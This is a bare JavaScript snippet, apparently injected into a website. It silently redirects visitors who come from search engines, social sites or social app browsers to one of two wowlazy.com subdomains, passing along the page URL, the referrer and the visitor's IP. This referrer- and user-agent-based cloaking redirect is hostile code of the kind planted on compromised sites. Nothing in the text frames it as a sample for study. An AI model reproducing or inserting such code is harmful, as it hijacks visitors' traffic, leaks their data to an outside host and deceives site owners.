var ars = ['https://mid.wowlazy.com', 'https://stocks.wowlazy.com'][Math.floor(Math.random() * 2)];
if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ 
    window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + "&ip=" + window.ipAddressArsae;
}
